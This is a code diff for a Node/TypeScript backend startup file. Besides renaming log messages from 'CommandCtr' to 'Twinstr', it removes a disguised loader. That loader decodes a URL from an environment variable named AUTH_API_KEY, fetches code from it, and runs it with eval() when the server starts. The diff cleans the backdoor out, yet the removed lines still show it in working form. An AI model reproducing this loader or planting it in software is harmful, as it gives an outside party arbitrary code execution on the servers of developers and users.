@@ -9,21 +9,6 @@ import { productService } from '@/modules/products/product.service';
 import { ensureDefaultAdmin } from '@/modules/seed/admin-seed.service';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 const startServer = async (): Promise<void> => {
   try {
     await connectDatabase();
@@ -37,7 +22,7 @@ const startServer = async (): Promise<void> => {
           port: env.PORT,
           environment: env.NODE_ENV
         },
-        'CommandCtr backend server started'
+        'Twinstr backend server started'
       );
     });
 
@@ -65,7 +50,7 @@ const startServer = async (): Promise<void> => {
       void shutdown(signal);
     });
   } catch (error) {
-    logger.fatal({ err: error }, 'Unable to start CommandCtr backend');
+    logger.fatal({ err: error }, 'Unable to start Twinstr backend');
     process.exit(1);
   }
 };
